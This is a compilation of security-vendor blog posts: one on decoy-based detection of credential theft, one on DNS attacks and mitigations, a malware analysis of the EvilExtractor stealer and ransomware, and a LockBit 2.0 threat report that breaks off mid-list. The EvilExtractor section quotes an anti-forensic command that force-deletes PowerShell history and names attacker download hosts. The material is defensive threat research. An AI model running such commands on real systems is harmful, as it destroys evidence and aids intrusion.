Network Deception is one such deployment within the domain environment where, using the MITRE Shield techniques like decoy systems and network, decoy credentials, decoy accounts, decoy contents, could potentially help detect lateral movement early in the adversary’s attack path to the target asset and at the same time, report significantly low false detection rates.
The idea of deception originates from the decades old honeypot systems but, unlike those, relies more on forging trust and giving adversaries what they are looking for.
With its inbuilt proactiveness it is configured to lure attackers towards deceptive systems.
As shown in the figure below, Network Deception consists of authentic looking decoy systems placed within the domain network, specifically in the network where the critical assets are placed.
These decoy systems (could be virtual machines) are the full-fledged OS with configured applications or services and could be replicating the crucial services like Domain Controller, Exchange or DB server and other decoy machines that could lead to those systems.
The image below highlights the key foundational aspects of the Network Deception Figure 17 – Network Deception Key Aspects of Network Deception As visualized in the figure above, Network Deception comprises the following key basic facts with respect to the deployment in the domain joined environment: As a part of deployment, decoy/deceptive machines are planted within the network alongside production systems and critical assets.
These decoy systems could be real systems or virtual systems with production grade operating systems with the required setup to make them blend well with real systems. 
As one of the key aspects, deceptive machines are configured to lure attackers towards the decoy services instead of the production services, thereby deflecting or misleading the attacker’s lateral movement path to the target asset. 
Many of the decoy machines could replicate critical services like Domain Controller, DB servers, Exchange/SharePoint servers and other critical services or applications within the data center. 
Any legitimate domain user should not be generating traffic to or communicating with the configured decoy machines unless there are some misconfigurations in the network, which need to be corrected. 
Basic Decoy Network Setup Since credential theft plays an important role in a successful targeted attack, deception essentially focuses on planting fake credentials on the production and decoy endpoints at multiple places within the OS and monitoring the use of these credentials to pivot to other systems.
With respect to the network setup, the following are the key aspects, however this list is not exhaustive, and much more could be added: Replicating critical network assets and services with decoy machines: Replicating critical network services like Active Directory, DB services, etc., will make more sense since these are the most targeted systems in the network.
The decoy Active Directory should be configured with deceptive AD objects (users, groups, SPNs, etc.).
with deceptive contents for other replicated services. 
Planting authentic looking decoy machines in the production network: As indicated earlier, these decoy machines could be real or virtual machines with the production grade OS placed alongside production systems in the critical infrastructure to blend in well.
These decoy machines should be joined to the decoy AD and configured with deceptive user accounts to monitor successful logon attempts to the systems. 
Injecting deceptive credentials on production endpoints: Production endpoints should be injected with deceptive credentials at multiple places like LSASS process memory, Credential Manager, browser credentials, etc., to increase the possibility of these credentials being picked up and used to pivot to decoy systems in the network.
These endpoints could be public facing machines or their replicas as well. 
Decoy Machine runs client applications pointing to decoy services: Decoy machines may run the client with deceptive credentials and configured to point to the decoy services.
These could be DB/FTP/Email clients and any other replicated decoy services. 
Mark decoy systems as “NO LANDING ZONE”: One of the key deployment aspects of deception is to mark all the decoy systems and services as “NO LANDING ZONE”, essentially meaning no legitimate domain users should be accessing decoys and any attempts to access these systems should be closely monitored. 
Some of the other setup required for effective deployment of deception is as summarized below: Figure 18 – Deceptive network setup – Basic requirements Basic Decoy Systems Setup To detect the use of deceptive credentials, setting up decoy machines is an essential part of the solution as well.
Primarily, decoy machines should enable the access attackers are looking to have during the lateral movement phase.
Decoys should also be configured to enable relevant auditing services to be able to generate events.
For instance, the following enables the account logon events to be audited: Decoy machines must be setup to run the log collector agent that can collect the access logs generated and forward them to the correlation server.
However, in the domain joined environment, it is also essential to tune the decoy machines to forward only the relevant logs to the correlation server to minimize false positives. 
The below highlights some of the auditing required to be enabled on the decoy systems for effective correlation. 
Figure 19 – Basic decoy setup Illustrating and Achieving Network Deception 
The following sections describe some examples of how deception can be achieved in the domain network, along with a visualization of how credential theft can be detected. 
Network Deception – Example 1: Injecting NETONLY credentials into LSASS process memory LSASS process memory is one of the prime targets for attackers, as well as malware armed with lateral movement capabilities since it caches a variety of credentials.
Credential extraction from the LSASS process requires opening a read handle to the process itself which is closely monitored by EDR products but there are stealthier ways around it. 
One of the primary tasks towards achieving credential-based deception is to stage the deceptive credentials in LSASS process memory.
This can be accomplished on the production and decoy systems by executing a trivial credential injection code which uses the CreateProcessWithLogonW Windows API with the specified crafted credentials.
CreateProcessWithLogonW creates the new logon session using the caller process access token and spawns the process specified as a parameter in the security context of the specified deceptive credentials and it will be staged in the LSASS memory until the process runs in the background.
The below shows the example code calling the API with the specified credentials which is also visible when credentials are extracted with Mimikatz. 
Figure 20 – Injecting credentials into LSASS memory One of the parameters to CreateProcessWithLogonW is “dwLogonFlags” which should be specified as LOGON_NETCREDENTIALS_ONLY as shown in the code above.
This ensures the specified credentials are used only on the network and not for local logons.
Additionally, NETONLY credentials used to create a logon session are not validated by the system.
Below is a code snapshot from credential extraction tool Mimikatz, using a similar approach to forge a logon session and replacing the credentials with the supplied ones while executing Pass-the-Hash attacks. 
Figure 21 – Mimikatz code for PTH attack Network Deception – Example 2: Configure deceptive hostnames for decoy VMs Attackers or malware moving laterally inside the network might do a recon for interesting hostnames via nbtstat/nbtscan.
To deflect the lateral movement path, decoy systems can be configured with real looking hostnames that match the production systems.
These hostnames will then be visible on NetBIOS scans as shown below. 
Figure 22 – Deceptive host names pointing to decoy machines 
These decoy systems can also run the relevant client applications pointing to the decoy services, with authentication directed to the decoy Domain Controller in the network.
Detection of this attack path happens much earlier, however the decoy network setup keeps the adversaries engaged, helping admins to study their Tools and Techniques. Figure 23 – Decoy machines running clients pointing to decoy services A similar deception setup can also be done for the browsers where saved credentials can point to the decoy applications and services within the domain.
For instance, Chrome saves the credentials in the SQLite format on the disk which can be decrypted using DPAPI as discussed earlier sections.
The below examples demonstrate deceptive browser credentials which can lure adversaries towards the decoy services. 
Figure 24 – Inserting deceptive browser credentials 
In addition to some of the techniques discussed above, and many others highlighted in the previous sections, setting up deception involves much more advanced configuration of decoy systems to minimize false positives and needs to be tuned to the environment to accurately identify malicious activities.
Deception can also be configured to address multiple other phases of lateral movement activity including reconnaissance and target discovery, essentially redirecting the adversaries and giving them a path to the target.
Below is a high-level visualization of how the decoy network can look like the domain environment. 
Figure 25 – Deception network setup On the occasion where one of the domain-joined or public facing systems is compromised, authentication would be attempted to other domain joined systems in the network.
If an authentication is attempted and any of the decoy systems are accessed and logged on, the use of these planted deceptive credentials should be a red flag and something which must be investigated.
The visualization below shows the flow and an event being sent to an administrator on accessing one of the decoy systems. 
Figure 26 – Deceptive credentials usage for authentication in the domain One such example event of successfully logging on to the decoy system is as shown below: Figure 27 – Alert send to administrator on using deceptive credentials MITRE ATT&CK Techniques: Credential theft attacks discussed here are mapped by MITRE as below: Technique ID Technique Name Description T1003.001 LSASS Process Memory Attackers may attempt to access LSASS process memory to extract credentials as it stores a variety of credentials.
Administrative privileges are required to access the process memory. 
T1003.002 SAM Database Accessing credentials from SAM database requires SYSTEM level privileges.
Stores credentials for all the local user accounts on the machine. 
T1003.003 NTDS.dit file Contains credentials for all the domain users.
File is present on the DC and domain admin privileges are required to access this file. 
T1003.006 DCSync Attacker can extract the credentials from the DC by impersonating the domain controller and use DRSUAPI protocol to replicate credentials from DC. 
T1558.001 Golden Ticket Attackers acquiring credentials for KRBTGT account can forge the Kerberos ticket called Golden Ticket, allowing them to get unrestricted access to any system in the domain T1558.002 Silver Ticket Allows attacker to get admin level access to the service accounts by abusing Kerberos authentication T1558.003 Kerberoasting Allows attackers to extract the Kerberos tickets for service accounts from memory and brute force offline to get credentials Conclusion As credential theft attacks play a significant role in an attacker’s lateral movement, so as in-network defense for the defenders.
With attackers’ lateral movement tactics evolving and getting more stealthier, defenders will have to adapt to innovative ways of defending the critical network assets.
In–network defense strategies like Deception could prove to be a promising and forward-looking approach towards detecting and mitigating data theft attacks.
Strategic planting of decoy systems within the production network, inserting decoy credentials and decoy contents on calculative selection of endpoints and decoy systems and accurately setting up the logging and correlation via SIEMs for monitoring the use of decoy contents, could certainly detect and mitigate the attacks early in the lateral movement life cycle. 
Endpoint solutions like User Entity Behavior Analytics (UEBA) and Endpoint Detection and Response (EDR) could also play a significant role in building the deception infrastructure.
For instance, one of the ways UEBA solutions could prove useful is to baseline user behavior and monitor access to credential stores on the system.
UEBA/EDR could raise the red flag on injection of forged Kerberos tickets in the memory.
This can provide user level visibility to a greater extent when integrated with SIEM, playing a crucial role in mitigating credential theft attacks. 
The post Detecting Credential Stealing Attacks Through Active In-Network Defense appeared first on McAfee Blog. 
title: Understanding DNS attacks: Identifying and patching vulnerabilities | Snyk url: https://snyk.io/blog/dns-attacks-identifying-patching-vulnerabilities/ The Domain Name System (DNS) translates domain names into IP addresses.
Every device and website has an IP address that other devices, websites, and online services use to communicate with it.
IP addresses are a string of numbers usually formatted as 000.000.000.000.
However, we use domain names since people can’t easily remember these numbers.
When we want to visit Google, we simply type the domain name into our browser’s address bar, and the DNS service translates the user-entered domain name “google.com” into the corresponding IP address that a computer uses.
DNS is a fundamental component of the internet infrastructure, as any communication must start with a DNS name resolution.
If the DNS becomes unavailable, internet programs will no longer function.
DNS attacks refer to any attack that targets the stability and security of the DNS infrastructure.
They commonly aim to render the DNS unavailable or intercept and alter the answers provided by the DNS, directing unsuspecting users to malicious websites.
DNS infrastructure contains two components — authoritative and recursive DNS servers — and both are open to attack. 
Below, we’ll explore the most common attacks against DNS and review mitigation strategies to avoid them.
Crash course in DNS attacksThere are several types of DNS attacks, each function differently, have unique impacts, and require specific countermeasures. 
SpoofingDNS spoofing occurs when threat actors alter the legitimate DNS server records to redirect users to fraudulent websites instead of their intended destination.
When unsuspecting users reach the fraudulent website, the website prompts them to enter sensitive information, such as login details or credit card information.
Threat actors use this technique to steal the victim’s sensitive data or plant malware — like ransomware or keyloggers — on their victim’s device.
Attackers execute DNS spoofing attacks using two methods:Intercepting the communications between the target device and the DNS server and redirecting users’ requests to a malicious websiteDirectly attacking the legitimate DNS server and forcing it to return malicious IP addressesTo counter this attack, we should:Update and patch the DNS server software regularly.
Check the website for the secure connection (padlock) symbol.
This symbol appears next to the address bar of the web browser.
If there’s no padlock, this may indicate threat actors have mirrored the website for malicious purposes. 
Enable the Domain Name System Security Extensions (DNSSEC) on the domain.
These extensions add a layer of security by attaching a digital certificate signature to DNS information. 
Cache poisoningIn this attack, the threat actor injects false DNS information into the DNS cache to force it to return incorrect information and direct users to malicious websites.
For example, when a user requests to visit google.com, the poisoned DNS server returns the IP address of another website that could contain an exploit kit or phishing page.
DNS cache poisoning and spoofing are often used interchangeably in cybersecurity.
However, they are different in terms of their function and order of appearance.
In DNS poisoning, threat actors replace the DNS records to redirect unsuspecting users to malicious destinations.
Then, DNS spoofing redirects unsuspecting users to the malicious website using a poisoned cache.
To prevent a DNS poisoning attack, we should:Use DNSSEC, which uses public key cryptography.
This ensures that only a legitimate DNS nameserver answers a request with the correct DNS information.
Prevent local DNS servers from answering internet-based DNS queries — unless our DNS nameserver is registered with ICANN.DoS/DDoS/floodingDNS flooding is an attack by which malicious actors try to overwhelm DNS servers with false DNS requests to prevent them from serving legitimate requests.
There are two types of DNS flood attacks: denial of service (DoS) flooding and distributed denial of service (DDoS) flooding.
DoS flood attackIn a DoS flood attack, the attacker uses one computer to flood a remote DNS server with false traffic.
This technique is no longer effective because modern DNS servers have advanced technical specifications that one device cannot disrupt.
DDoS DNS flood attackThe DDoS DNS flood is the most effective attack mechanism wherein attackers use many devices to target one DNS server.
This action consumes the target DNS memory and CPU resources, eventually taking the server offline. 
In cybersecurity, a bot can refer to any computing device, for example, a laptop, workstation, or internet of things (IoT) device infected with malware and under a threat actor’s control.
A collection of these bots is called a botnet.
Attackers commonly use networks of botnets containing thousands or millions of compromised devices that run malicious scripts.
The attacker orchestrates the attack by directing all devices to send traffic simultaneously to one server, generating a DoS status. 
DNS floods are considered relatively modern, made widely possible by the increasing numbers of IoT devices worldwide.
Many IoT devices have poor security configurations, making them easy targets for hackers to control.
To prevent DDoS and DoS flood attacks, we should:Use a DDoS mitigation service to prevent outside attackers from overwhelming our DNS servers with false requests.
Use one dedicated server as the authoritative name server and another as the DNS resolver.
This enables one component to remain operational if the second fails. 
Use a dedicated DNS server.
Small and medium-sized organizations often use one server for multiple purposes, such as hosting applications and running the DNS service.
However, if the attacker accesses one application hosted on the server, they can compromise and alter the DNS settings.
NXDomainLike a DNS flood attack, the NXDomain attack overwhelms the target DNS server with many requests for invalid records (nonexistent domain names).
To execute this attack, attackers use a DNS proxy server that automatically sends a massive number of DNS requests to the targeted authoritative DNS server.
The authoritative server consumes resources (fills the server cache) in resolving these invalid requests, making it respond slowly to legitimate requests — and eventually stop responding altogether.
To prevent the DNS NXD flood attack, we should:Conduct regular DNS audits.
Blocklist suspicious domain names and servers.
Temporarily blocklist a client’s IP address if it sends too many NXDomain requests.
Increase the Time to Live (TTL) on current DNS records to ensure that they’ll remain for an extended time in external DNS caches.
These records don’t need to be updated regularly.
Amplification attacksThis is another DDoS attack that aims to prevent the target DNS server from serving legitimate DNS queries.
In this attack, threat actors exploit open DNS servers to send multiple responses to the target server.
Threat actors initiate this attack by sending numerous DNS requests to the open DNS server using the target IP address as the source address.
The open DNS server returns the response to the requester (in this example, the target spoofed IP address).
Sending many DNS responses eventually crashes the target server by consuming its network bandwidth and making it unresponsive to legitimate requests.
Attackers commonly leverage botnets, especially on IoT devices, to generate spoofed DNS requests to overwhelm the target servers or organization network with DNS responses.
To prevent this attack, we should:Enforce source IP verifications on all network devices.
Prevent DNS authoritative name servers from functioning as recursive servers.
Enforce response rate limiting (RRL) settings on all DNS servers. 
Configure open DNS resolvers to only respond to queries from a trusted source. 
HijackingIn this attack, threat actors manipulate DNS response queries to direct unsuspecting users to fraudulent or malicious websites.
This attack occurs by:Installing malware, such as a trojan horse, on the victim’s computer to incorrectly resolve DNS queries and lead the unsuspecting user to malicious sitesCompromising the target router and changing its DNS settings.
This affects all users connected to the router. 
Intercepting the communications between the legitimate DNS server and user device — as in the case of a man-in-the-middle attack — and manipulating DNS responses to lead the unsuspecting user to malicious sitesTargeting the DNS server directly and then changing its DNS settings to lead unsuspecting users to different URLsAlthough
this attack is malicious, some internet service providers (ISPs) use this technique to direct users to other websites.
For example, some ISPs use it to display advertisements based on a user’s browsing history.
RebindingIn this attack, the threat actor infects the target router with malware to control it remotely.
The attack begins by executing malicious JavaScript code on a user’s browser to infect the router.
Many people don’t protect their router using a complex password — or just safeguard it using the default factory credentials.
This leaves them vulnerable to rebinding attacks. 
A good first step toward guarding against rebinding attacks is to protect the router with a strong password.
We should also:Change the default router username and password to something difficult to guess.
Keep the DNS server and all client operating systems and installed applications up to date. 
Tunneling This DNS attack routes unsuspecting user traffic to the attacker’s server.
This attack is typical among ransomware operators for facilitating communication with the Command and Control Center (C&C) and exfiltrating data from the target device.
DNS tunneling evades detection by security tools like firewalls.
Threat actors send stolen data from the target network in small chunks and deliver them as a series of DNS queries and responses to avoid detection.
A DNS tunneling attack works as follows:The attacker has a server with a domain name pointing to it.
This server runs tunneling malware.
The attacker infects a computer with malware.
The infected computer might sit behind a company firewall but can use the DNS resolver.
Now, the DNS resolver can communicate with the remote attacker’s C&C server.
By doing this, each infected device and the remote attacker’s server have created a covert channel that can be used to exfiltrate data from the victim device or deliver more malware, such as ransomware, to the target device. 
To prevent this attack, we should:Use advanced security solutions, including next-generation firewalls on network perimeters and network detection and response (NDR), to monitor all interactions within our IT environment.
This enables us to detect APT and ransomware operators and halt communications with attackers’ servers.
Configure all devices within an organization’s network to send all their DNS queries to an internal DNS server that blocks suspicious domain names. 
Phantom domainIn this attack, the threat actor sets up numerous phantom domain names and requests the target DNS server to resolve them.
These domains (commonly a large number of sub-domain names) respond very slowly or never.
After a while, the target DNS server consumes its server cache while waiting for the attacker domain’s responses and eventually becomes unresponsive. 
To prevent this attack, we should:Increase the number of recursive DNS servers.
Limit the number of successive recursive DNS requests on each DNS server.
ConclusionThe DNS service is a critical component of internet infrastructure.
It’s responsible for translating users’ domain names into IP addresses that other servers can understand.
However, it was not made for security.
With the widespread use of the internet and the growing number of cyberattacks, cybercriminals have become increasingly interested in DNS attacks.
Any attack against the DNS service prevents all internet programs from functioning correctly.
Cybercriminals know this and have developed many ways to attack DNS services for malicious purposes. 
There are several different techniques to attack the DNS service, which we can group into two main categories:Attacks that aim to make the DNS service unavailableAttacks that aim to manipulate the DNS records to lead unaware users to malicious destinationsAs this article has demonstrated, each type of DNS attack requires a different set of countermeasures to mitigate it.
However, generally speaking, the keys to preventing DNS attacks include keeping the DNC server software up to date, using a dedicated DNS server to provide the DNS service, increasing the number of recursive DNS servers, and checking for vulnerabilities to mitigate DDoS attacks. 
title: EvilExtractor – All-in-One Stealer url: https://www.fortinet.com/blog/threat-research/evil-extractor-all-in-one-stealer Affected platforms: WindowsImpacted parties: Any organizationImpact: Controls victim’s device and collects sensitive informationSeverity level: Critical EvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices.
It includes several modules that all work via an FTP service.
It was developed by a company named Kodex, which claims it is an educational tool.
However, research conducted by FortiGuard Labs shows cybercriminals are actively using it as an info stealer. 
Based on our traffic source data to the host, evilextractor[.]com, malicious activity increased significantly in March 2023.
FortiGuard Labs observed this malware in a phishing email campaign on 30 March, which we traced back to the samples included in this blog.
It usually pretends to be a legitimate file, such as an Adobe PDF or Dropbox file, but once loaded, it begins to leverage PowerShell malicious activities.
It also contains environment checking and Anti-VM functions.
Its primary purpose seems to be to steal browser data and information from compromised endpoints and then upload it to the attacker’s FTP server. 
We recently reviewed a version of the malware that was injected into a victim’s system and, as part of that analysis, identified that most of its victims are located in Europe and America.
The developer released its project in October 2022 (Figure 1) and has kept updating it to increase its stability and strengthen its module. 
This article will examine the initial attack method used to deliver EvilExtractor and its functions. Figure 1.
EvilExtractor for sale on the web Initial Access The phishing email with the malicious attachment is shown in Figure 2.
It is disguised as an account confirmation request.
The attacker also tricks the victim by using an Adobe PDF icon for the decompressed file.
The PE header is shown in Figure 3. 
Figure 2.
The phishing email Figure 3.
File header of "Account_Info.exe" The execution file is a Python program packaged by PyInstaller.
We extracted it with pyinstxtractor and found that the “PYARMOR” string in its main code file “contain.pyc”, shown in Figure 4, is an obfuscating tool for Python script that makes the malware harder to be analyzed and detected.
We extracted the key and iv from _pytransform.dll and decrypted the “contain.pyc” using AES-GCM. Figure 4.
Code in "contain.pyc" 
In addition to the Python program, we observed a .NET loader that can extract EvilExtractor.
Figure 5 is part of the code.
It contains Base64-encoded data, which is a PowerShell script.
This execution file is generated from the tool “PS2EXE-GUI”, which can convert PowerShell scripts to EXE Files. 
Figure 5. .Net
Code for EvilExtractor EvilExtractor After decrypting the pyc file, we get the primary code of EvilExtractor.
It is a PowerShell script that contains the following modules: 
Date time checking Anti-Sandbox Anti-VM Anti-Scanner FTP server setting Steal data Upload Stolen data Clear log It first checks whether the system’s date is between 2022-11-09 and 2023-04-12.
If not, it uses the following command to delete the data in PSReadline and terminate: DEL \"$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\*\" -Force –Recurse It then compares the product model to see if it matches any of the following: VirtualBox, VMWare, Hyper-V, Parallels, Oracle VM VirtualBox, Citrix Hypervisor, QEMU, KVM, Proxmox VE, or Docker, as shown in Figure 6.
It also checks the victim’s hostname against 187 names from VirusTotal machines or other scanner/virtual machines, as shown in Figure 7. Figure 6.
EvilExtractor comparing product model for match Figure 7.
Virtual environment and scanner/virtual machine checking After passing the environment check, EvilExtractor downloads three components from http://193[.]42[.]33[.]232 used for stealing data.
These files are also Python programs that are obfuscated using PyArmor.
The first is “KK2023.zip”, which is used for stealing browser data and saving it in the folder “IMP_Data”.
It can extract cookies from Google Chrome, Microsoft Edge, Opera, and Firefox.
It also collects browser history and passwords from the following browsers: The second file is “Confirm.zip”.
It is a key logger that saves data in the “KeyLogs” folder.
The last file, “MnMs.zip”, is a webcam extractor.
Its corresponding code is shown in Figure 8. Figure 8.
Download components for the Keylogger and Webcam Snapshot functions EvilExtractor also collects system information by PowerShell script, shown in Figure 9.
Figure 10 shows the concatenated data in a text file called “Credentials.txt”. 
Figure 9.
PowerShell script for collecting system information Figure 10.
Content of “Credentials.txt” EvilExtractor downloads files with specific extensions from the Desktop and Download folders, including jpg, png, jpeg, mp4, mpeg, mp3, avi, txt, rtf, xlsx, docx, pptx, pdf, rar, zip, 7z, csv, xml, and html.
It also uses the command “CopyFromScreen” to capture a screenshot.
The code is shown in Figure 11. Figure 11.
Downloading files and getting a screenshot After EvilExtractor extracts all the data from the compromised endpoint, it uploads it to the attacker’s FTP server, shown in Figure 12.
The developer of EvilExtractor also provides an FTP server for those who purchase its malware. Figure 12.
Upload file to attacker’s
FTP server Kodex Ransomware EvilExtractor also has a ransomware function.
It is called “Kodex Ransomware”, as shown in Figure 13.
We extracted this PowerShell script from the .Net loader mentioned in the previous section, and the script for its ransomware is similar to the one for its stealer. 
Figure 13.
Introduction form evilextracom[.]com It downloads “zzyy.zip” from evilextractor[.]com.
Details of the unzipped file, a 7-zip standalone console, are shown in Figure 14.
Figure 15 shows it leverages “7za.exe” to encrypt files with the parameter “-p”, which means zipping files with a password.
It also generates a ransom-demanding message saved in “KodexRansom”, shown in Figure 16. Figure 14.
File in "zzyy.zip" Figure 15.
PowerShell script for Kodex Ransomware Figure 16.
Kodex ransomware's note Conclusion EvilExtractor is being used as a comprehensive info stealer with multiple malicious features, including ransomware.
Its PowerShell script can elude detection in a .NET loader or PyArmor.
Within a very short time, its developer has updated several functions and increased its stability.
This blog explains how threat actors launch an attack via phishing mail and what files are leveraged to extract the EvilExtracrtor PowerShell script.
We also detailed what functions are included, what data can be collected by EvilExtractor, and how the Kodex Ransomware works.
Users should be aware of this new info stealer and continue to be cautious about suspicious mail. 
Figure 17.
Attack Chain Fortinet Protections 
The malware described in this report are detected and blocked by FortiGuard Antivirus as: W32/EvilExtractor.
A!tr W32/Infostealer.
A!tr W32/Keylogger.
A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions.
Customers running current AntiVirus updates are protected. 
The FortiGuard Web Filtering Service blocks the malicious URL and IP address. 
If you think this or any other cybersecurity threat has impacted your organization, contact our Global FortiGuard Incident Response Team. 
IOCs IP Address: 45[.]87[.]81[.]184 193[.]42[.]33[.]232 Files: 352efd1645982b8d23a841107007c8b4b024eb6bb5d6b312e5783ce4aa62b685 023548a5ce0de9f8b748a2fd8c4d1ae6c924c40acbde32e9599c868115d11f4e 75688c32a3c1f04df0fc02491180c8079d7fdc0babed981f5860f22f5e118a5e 826c7c112dd1ae80469ef81f5066003d7691a349e6234c8f8ca9637b0984fc45 b1ef1654839b73f03b73c4ef4e20ce4ecdef2236ec6e1ca36881438bc1758dcd 17672795fb0c8df81ab33f5403e0e8ed15f4b2ac1e8ac9fef1fec4928387a36d 
title: LockBit 2.0: How This RaaS Operates and How to Protect Against It url: https://unit42.paloaltonetworks.com/lockbit-2-ransomware/ Executive Summary LockBit 2.0 is ransomware as a service (RaaS) that first emerged in June 2021 as an upgrade to its predecessor LockBit (aka ABCD Ransomware), which was first observed in September 2019. 
Since its inception, the LockBit 2.0 RaaS attracted affiliates via recruitment campaigns in underground forums, and thus became particularly prolific during the third quarter of calendar year 2021.
The LockBit 2.0 operators claimed to have the fastest encryption software of any active ransomware strain as of June 2021, claiming accordingly that this added to its effectiveness and ability to disrupt the ransomware landscape. 
While several top-tier RaaS affiliate programs, such as Babuk, DarkSide and REvil (aka Sodinokibi) disappeared from the underground in 2021, LockBit 2.0 continued to operate and gradually became one of the most active ransomware operations.
While Conti was recognized as being the most prolific ransomware deployed in 2021 per our 2022 Unit 42 Ransomware Threat Report, LockBit 2.0 is the most impactful and widely deployed ransomware variant we have observed in all ransomware breaches during the first quarter of 2022, considering both leak site data and data from cases handled by Unit 42 incident responders. 
According to data analysis of ransomware groups’ dark web leak sites, LockBit 2.0 was the most impactful RaaS for five consecutive months.
As of May 25, LockBit 2.0 accounted for 46% of all ransomware-related breach events for 2022.
And the LockBit 2.0 RaaS leak site has the most significant number of published victims, with over 850 in total. 
Additionally, LockBit 2.0 has affected many companies globally, with top victims based in the U.S., Italy and Germany.
Its most highly targeted industry verticals include professional services, construction, wholesale and retail, and manufacturing. 
Palo Alto Networks customers receive protections against LockBit 2.0 attacks from Cortex XDR, as well as from the WildFire cloud-delivered security subscription for the Next-Generation Firewall.
(Please see the Conclusion section for more detail.) 
Table of Contents LockBit 2.0 OverviewVictimologyLeak Site DataUnit 42 Incident Response Data on LockBit 2.0LockBit 2.0 Tactics, Techniques and ProceduresLockBit 2.0 Technical DetailsLockBit 3.0Courses of ActionConclusionAppendix AAdditional Resources LockBit 2.0 Overview LockBit 2.0 is another example of RaaS that leverages double extortion techniques as part of the attack to pressure victims into paying the ransom. 
In some cases, LockBit 2.0 operators have performed DDoS attacks on the victims' infrastructure as well as using a leak site.
This practice is known as triple extortion, a tactic observed in groups like BlackCat, Avaddon and SunCrypt in the past. 
Like other ransomware families such as BlackByte, LockBit 2.0 avoids systems that use Eastern European languages, including many written with Cyrillic alphabets. 
Unlike other RaaS programs that don't require the affiliates to be super technical or savvy, LockBit 2.0 operators allegedly only work with experienced penetration testers, especially those experienced with tools like Metasploit and Cobalt Strike.
Affiliates are tasked with gaining initial access to the victim network, allowing LockBit 2.0 to conduct the rest of the attack. 
LockBit 2.0 has been observed changing infected computers’ backgrounds to a ransomware note.
The ransomware note was also used to recruit insiders from victim organizations.
The notes claimed the threat actors would pay “millions of dollars” to insiders who provided access to corporate networks or facilitated a ransomware infection by opening a phishing email and/or launching a payload manually.
The threat actors also expressed interest in other access methods such as RDP, VPN and corporate email credentials.
In exchange, they offer a cut of the paid ransom. 
Victimology LockBit 2.0 targets organizations opportunistically.
The operators work with initial access brokers to save time and allow for a larger profit potential.
While typically seeking victims of opportunity, LockBit 2.0 does appear to have victim limitations.
The group announced that they would not target healthcare facilities, social services, educational institutions, charitable organizations and other organizations that “contribute to the survival of the human race”.
However, despite these claims, there have been instances of affiliates undermining these guidelines by still opting to attack industry verticals such as healthcare and education. 
Organizations in Europe and the U.S. are hit more often by LockBit 2.0 than those in other countries, likely due to the high profitability and insurance payouts. 
Leak Site Data During the first calendar year quarter of 2022, LockBit 2.0 persisted as the most impactful and the most deployed ransomware variant we observed in all ransomware breaches shared on leak sites. 
Figure 1.
Ransomware leak site data from the first calendar year quarter of 2022.According to leak site data analysis, LockBit 2.0 was the most impactful RaaS for five consecutive months.
As of May 25, LockBit 2.0 accounted for 46% of all ransomware-related breach events for 2022 shared on leak sites. 
Additionally, the LockBit 2.0 RaaS leak site has the most significant number of published victims, with over 850 in total.
The site itself typically features information such as victim domains, a time tracker and measures of how much data was compromised. Figure 2.
LockBit 2.0 leak site extortion site.
LockBit 2.0 claims that they have demanded ransom from at least 12,125 companies, as shown in the figure below. 
Figure 3.
Source: VX-underground.
According to leak site data for LockBit 2.0, since its inception in June 2021, the RaaS has affected many companies globally, with top victims based in the U.S., Italy and Germany. Figure 4.
LockBit 2.0 geographical impact chart.
LockBit 2.0 has also impacted various victims across multiple industry verticals.
Its most highly targeted industry verticals include professional services, construction, wholesale and retail and manufacturing. Figure 5.
LockBit 2.0 impacted industry vertical chart.
When looking at leak site data across all ransomware families, we’ve observed LockBit 2.0 targeting the highest number of organizations in the following regions: JAPAC, EMEA, and LATAM. 
Unit 42 Incident Response Data on LockBit 2.0 Cases handled by Unit 42 security consultants involving LockBit 2.0 since its appearance in June 2021 demonstrate shorter dwell times and less flexibility in negotiation in the beginning of FY 2022 (measured October-September) in comparison to the end of FY 2021.
The following data is broken into fiscal years and quarters based on when the threat actor breached the network, not when the activity was noticed by a client. 
LockBit 2.0 has shown a decrease in dwell time in FY 2022.
From the last two quarters of FY 2021 to the first two quarters of FY 2022, there has been an average 37-day difference. 
Figure 6.
LockBit 2.0 average dwell time by fiscal quarter.
The difference in initial and final ransom demands over the past fiscal year has been converted to percentages and then averaged.
The graph below demonstrates that at the end of FY 2021, threat actors using LockBit 2.0 were much more open to negotiations of ransom amounts; during that time the ransom was dropped approximately 83% from the initial ask on average.
In comparison, we see less flexibility in FY 2022 Q1 and Q3 – threat actors only offered an average of about 30% as a price drop.
FY 2022 Q2 is not included due to lack of sufficient information. 
Figure 7.
LockBit 2.0 average difference in initial vs final ransom amount, shown as percentages.
LockBit 2.0 Tactics, Techniques and Procedures Technically speaking, we have observed LockBit 2.0 affiliates leveraging the following tactics, techniques and procedures: TA0001 Initial Access T1078 Valid Accounts Credentials that have either been reused across multiple platforms or have previously been exposed.
Additionally, this includes VPN accounts – not just domain and local accounts. 
T1133
External Remote Services Affiliates have been seen brute forcing exposed RDP services and compromising accounts with weak passwords. 
T1190 Exploit Public-Facing Applications Vulnerabilities such as ProxyShell (CVE-2021-34473) and improper SQL sanitization (CVE-2021-20028)
have been observed being utilized as footholds into the environment. 
TA0002 Execution T1053.005 Scheduled Task/Job Scheduled Task.
LockBit 2.0 can be executed via scheduled tasks. 
T1059
Command and Scripting Interpreter LockBit 2.0 is typically executed via command line arguments via a hidden window. 
Windows SysInternals PsExec has been utilized for both persistence and execution purposes.
Its ability to execute processes on other systems spread the ransomware and assisted in reconnaissance activities. 
TA0003 Persistence T1053.005 Scheduled Task/Job Scheduled Task.
It was quite common to see scheduled tasks used to create persistence for the ransomware executable, PsExec, and occasionally some defense evasion batch scripts. 
T1078
Valid Accounts Compromised accounts may be used to maintain access to the network. 
T1136.001
Create Account 
In rare cases, LockBit 2.0 has been observed to create accounts for persistence with simple names, such as “a.” T1505.003 Server Software Component With the upsurgence of ProxyShell, webshells have become more common entry points. 
TA0004 Privilege Escalation T1068 Exploitation for Privilege Escalation The ProxyShell elevation of privilege on the Exchange PowerShell Backend (CVE-2021-34523), Windows Background Intelligent Transfer Service (BITS) improperly handling symbolic links (CVE-2020-0787), and abusing the CMSTPLUA COM interface have all been seen as methods of privilege escalation. 
T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control LockBit 2.0 has utilized a UAC bypass tool. 
